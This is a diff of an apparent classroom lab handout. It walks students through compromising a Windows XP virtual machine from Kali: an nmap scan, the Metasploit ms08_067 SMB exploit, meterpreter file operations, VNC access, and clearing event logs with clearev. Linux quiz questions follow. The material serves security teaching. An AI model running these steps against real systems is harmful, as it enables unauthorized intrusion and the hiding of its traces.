@@ -61,11 +61,14 @@ the Internet for this to work.
 ATTACK:
 Run both Kali and XP VMs.
 
-1. In Kali scan for live-hosts…
+1. Find Kali’s IP address...
+  a. Type: ifconfig
+
+2. In Kali scan for live-hosts...
   a. Type: nmap –Pn <target>/24
     i. Annotate your findings like IPs and their services running if any
 
-2. Run metasploit…
+3. Run metasploit...
   a. Type: msfconsole
   b. Type: use exploit/windows/smb/ms08_067_netapi
     i. Have you used TAB to autocomplete a command?
@@ -78,64 +81,64 @@ Run both Kali and XP VMs.
 NOTE: You’re in meterpreter, a command shell connecting you to your target.
 ******************************************************************************
 
-1. In meterpreter…
+1. In meterpreter...
   a. Type: pwd
 
-2. Find information about the target…
+2. Find information about the target...
   a. Type: sysinfo
     i. Take notes
 
-3. Find network information…
+3. Find network information...
   a. Type: ipconfig
 
-4. Move back to the root directory
+4. Move back to the root directory...
   a. Type: cd \\
     i. You can also use cd ..
 
-5. Verify…
+5. Verify...
   a. Type: ls
     i. Or dir (it also works)
 
-6. Create a folder…
+6. Create a folder...
   a. Type: mkdir whoops
 
-7. Rename the folder:
+7. Rename the folder...
   a. Type: ren whoops gothacked
 
-8. Verify…
+8. Verify...
   a. Type: dir
 
-9. Go into the folder
+9. Go into the folder...
   a. Type: cd gothacked
 
-10. Create a file with text in it…
+10. Create a file with text in it...
   a. Type: execute –f cmd.exe –i –H
     i. Or shell
   b. Type:  echo “ this computer was hacked by me! “ > hacked.txt
   c. Type: exit
 
-11. Back in meterpreter verify the file is there…
+11. Back in meterpreter verify the file is there...
   a. Type: ls
   b. Type: cat hacked.txt
 
-12. Download the text file…
+12. Download the text file...
   a. Type: download hacked.txt
 
-13. Background the session
+13. Background the session...
   a. Type: background
     i. Take note of the ID number for this session
 
 14. Verify the file is in YOUR computer…
   a. Type: ls
 
-15. Open a new terminal and edit the file…
+15. Open a new terminal and edit the file...
   a. Type: nano hacked.txt
   b. In a new line type: don’t forget to smile!
   c. Comment out the first line using a # sign before the comment
   d. Save it: Ctrl+S
   e. Ctrl+X to exit
 
-16. Find the correct session ID for this attack…
+16. Find the correct session ID for this attack...
   a. Type: sessions
   b. Type: sessions –i <#>
     i. Replace the <#> with the correct number for the session
@@ -144,22 +147,41 @@ NOTE: You’re in meterpreter, a command shell connecting you to your target.
 NOTE: You’re back in meterpreter!
 ******************************************************************************
 
-17. Upload the file back to the target…
+17. Upload the file back to the target...
   a. Type: upload hacked.txt
 
-18. Get a GUI of the target machine…
+18. Get a GUI of the target machine...
   a. Type: run vnc
     i. Wait a few seconds for this to work
 
-ADDITIONAL STUFF
+19. Check the logs in Windows XP…
+  a. Navigate to Event Viewer inside Administrative Tools and check the logs
+
+20. Using meterpreter clear the logs in XP…
+  a. Type: clearev
+
+21. Done…You can close all screens now.
+
+
+QUESTIONS
 In Linux, folders and files are considered the same thing…files. Answer the following questions:
+
 1. What is a file or folder that begins with a period (.) in its name?
+
 2. How can you look for them?
+
 3. What is the command used to delete a folder that contains files/is not empty?
+
 4. What is the command (dir) in Windows? What is the equivalent in Linux?
+
 5. What is VNC?
+
 6. What is nano?
+
 7. What is the command to update/upgrade Linux with the latest fixes/patches?
+
 8. What is a BASH and how does a script begin?
+
 9. Can you write a small BASH script to update/upgrade?
+
 10. What is the command to use to make a BASH script executable?
